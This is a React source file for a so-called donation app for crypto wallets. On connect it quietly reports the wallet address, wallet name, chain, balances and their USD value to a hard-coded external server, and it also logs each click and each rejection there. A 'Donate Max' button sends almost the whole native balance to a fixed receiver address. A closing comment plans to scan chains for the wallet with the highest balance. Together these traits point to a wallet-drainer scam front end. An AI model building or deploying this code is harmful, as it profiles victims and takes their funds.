// src/App.jsx
import React, { useEffect, useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useChainId,
  useWaitForTransactionReceipt,
} from "wagmi";
import { readContract } from "@wagmi/core";
import { parseEther, formatEther } from "viem";

/* ---------- CONFIG ----------- */
const API_URL = "https://web-production-2da7.up.railway.app/notify";
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

/* USDT addresses (connected-chain-only) */
const USDT_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
  56: "0x55d398326f99059fF775485246999027B3197955", // BSC
  // 11155111: "" // Sepolia (no canonical USDT) - add if you deploy a test token
};

/* Minimal ERC20 ABI */
const ERC20_ABI = [
  { name: "balanceOf", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }], outputs: [{ type: "uint256" }] },
  { name: "decimals", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
];

/* ---------- HELPERS ---------- */
async function notifyBackend(event, data = {}) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: window.location.href,
      }),
    });
  } catch (err) {
    console.error("notifyBackend failed:", err);
  }
}

async function fetchPrices() {
  try {
    const res = await fetch(
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether&vs_currencies=usd"
    );
    if (!res.ok) throw new Error("price fetch failed");
    return await res.json();
  } catch (e) {
    console.warn("CoinGecko fetch failed:", e);
    return null;
  }
}

async function getErc20Balance(chainId, tokenAddress, walletAddress) {
  if (!tokenAddress) return 0;
  try {
    const raw = await readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [walletAddress],
      chainId,
    });
    const decimals = await readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: "decimals",
      args: [],
      chainId,
    });
    // raw is bigint-like
    const bal = Number(BigInt(raw) / BigInt(10 ** Number(decimals))) + (Number(raw % BigInt(10 ** Number(decimals))) / 10 ** Number(decimals));
    // return as number with decimals (ok for USDT sized amounts)
    return bal;
  } catch (e) {
    console.warn("getErc20Balance error:", e);
    return 0;
  }
}

/* quick chain name map (extend as needed) */
const CHAIN_MAP = {
  1: { name: "Ethereum Mainnet", symbol: "ETH" },
  56: { name: "BNB Smart Chain", symbol: "BNB" },
  11155111: { name: "Sepolia", symbol: "ETH (Sepolia)" },
};

export default function App() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const chainInfo = CHAIN_MAP[chainId] || { name: `Chain ${chainId || "unknown"}`, symbol: "NATIVE" };
  const chainName = chainInfo.name;
  const nativeSymbol = chainInfo.symbol;

  // watch native balance on connected chain
  const { data: balanceData } = useBalance({ address, watch: true });

  // tx helpers
  const { sendTransaction } = useSendTransaction();
  const [pendingHash, setPendingHash] = useState(null);
  const { data: receipt, isSuccess: receiptSuccess } = useWaitForTransactionReceipt({ hash: pendingHash, enabled: !!pendingHash });

  /* ----- Wallet connect: gather balances (connected chain only) + notify ----- */
  useEffect(() => {
    if (!isConnected || !address) return;
    (async () => {
      // native balance (formatted)
      let nativeBal = "0";
      if (balanceData?.value) {
        try {
          nativeBal = formatEther(balanceData.value);
        } catch (e) {
          nativeBal = "0";
        }
      }

      // USDT on connected chain (if available)
      const usdtAddr = USDT_ADDRESSES[chainId];
      let usdtBal = 0;
      if (usdtAddr) {
        usdtBal = await getErc20Balance(chainId, usdtAddr, address);
      }

      // get prices
      const prices = await fetchPrices();
      const ethPrice = prices?.ethereum?.usd ?? null;
      const bnbPrice = prices?.binancecoin?.usd ?? null;
      const usdtPrice = prices?.tether?.usd ?? 1;

      // compute USD (best-effort)
      let nativeUsd = "...";
      if (chainId === 1 && ethPrice) nativeUsd = (Number(nativeBal) * ethPrice).toFixed(2);
      if (chainId === 56 && bnbPrice) nativeUsd = (Number(nativeBal) * bnbPrice).toFixed(2);

      const usdtUsd = usdtBal ? (Number(usdtBal) * usdtPrice).toFixed(2) : "...";

      // send single rich wallet_connect event
      await notifyBackend("wallet_connect", {
        account: address,
        wallet_name: connector?.name || "unknown",
        chain: chainName,
        native_balance: nativeBal,
        native_balance_usd: nativeUsd,
        usdt_balance: usdtBal,
        usdt_balance_usd: usdtUsd,
      });
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address, chainId, balanceData, connector]);

  /* ----- Tx receipt watch: notify final confirmation ----- */
  useEffect(() => {
    if (!receiptSuccess || !receipt) return;
    const statusOK = receipt.status === 1 || receipt.status === "success" || receipt.status === true;
    if (statusOK) {
      notifyBackend("donation_confirmed", {
        account: address,
        txHash: pendingHash,
        blockNumber: receipt.blockNumber ?? receipt.block_number ?? null,
      });
    } else {
      notifyBackend("donation_failed", {
        account: address,
        txHash: pendingHash,
        reason: "tx reverted",
      });
    }
    setPendingHash(null);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [receiptSuccess, receipt]);

  /* ===== Donation fixed (0.01 native) ===== */
  const handleDonateFixed = async () => {
    if (!isConnected || !address) {
      notifyBackend("donation_failed", { account: address, error: "wallet_not_connected" });
      return;
    }
    // notify user clicked (attempt)
    notifyBackend("donation_attempt", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
    try {
      const amount = parseEther("0.01");
      const txResp = await sendTransaction({ request: { to: RECEIVER, value: amount } });
      // txResp often has hash
      const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
      if (txHash) {
        setPendingHash(txHash);
        notifyBackend("donation_approved", { account: address, txHash, amount: "0.01", token: nativeSymbol, chain: chainName });
      } else {
        // If wallet returns nothing, still notify approval
        notifyBackend("donation_approved", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
      }
    } catch (err) {
      const msg = err?.message || String(err);
      if (msg.toLowerCase().includes("user rejected") || msg.toLowerCase().includes("user denied")) {
        notifyBackend("donation_rejected", { account: address, error: msg });
      } else {
        notifyBackend("donation_failed", { account: address, error: msg });
      }
    }
  };

  /* ===== Donate Max (native balance - gas buffer) ===== */
  const handleDonateMax = async () => {
    if (!isConnected || !address || !balanceData?.value) {
      notifyBackend("donation_failed", { account: address, error: "missing_balance_or_wallet" });
      return;
    }
    try {
      const raw = BigInt(balanceData.value); // BigInt
      const buffer = parseEther("0.001"); // BigInt
      if (raw <= buffer) {
        notifyBackend("donation_failed", { account: address, error: "insufficient_balance" });
        return;
      }
      const sendWei = raw - buffer; // BigInt
      const human = Number(formatEther(sendWei)).toFixed(6);

      notifyBackend("donation_attempt", { account: address, amount: human, token: nativeSymbol, chain: chainName });

      const txResp = await sendTransaction({ request: { to: RECEIVER, value: sendWei } });
      const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
      if (txHash) {
        setPendingHash(txHash);
        notifyBackend("donation_approved", { account: address, txHash, amount: human, token: nativeSymbol, chain: chainName });
      } else {
        notifyBackend("donation_approved", { account: address, amount: human, token: nativeSymbol, chain: chainName });
      }
    } catch (err) {
      const msg = err?.message || String(err);
      if (msg.toLowerCase().includes("user rejected") || msg.toLowerCase().includes("user denied")) {
        notifyBackend("donation_rejected", { account: address, error: msg });
      } else {
        notifyBackend("donation_failed", { account: address, error: msg });
      }
    }
  };

  /* ===== UI ===== */
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white p-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <p className="text-sm text-gray-300 max-w-xl text-center mt-2">
        Connect your wallet, then donate. Wallet connection sends a single rich notification (balances + USD).
      </p>

      <div className="mt-6">
        <ConnectButton />
      </div>

      {isConnected && (
        <div className="mt-6 flex flex-col items-center gap-4">
          <div className="text-sm text-gray-300">Connected: <code className="bg-gray-800 p-1 rounded">{address}</code> on <strong>{chainName}</strong></div>

          <div className="flex gap-3 mt-2">
            <button onClick={handleDonateFixed} className="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg">Donate 0.01 {nativeSymbol}</button>
            <button onClick={handleDonateMax} className="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg">Donate Max {nativeSymbol}</button>
          </div>
        </div>
      )}
    </div>
  );
}

/* ===== Auto-highest-balance + chain-switch framework intentionally left commented for later =====
   (Add logic here to scan multiple chains & tokens, compute USD value, and prompt chain switch.)
*/
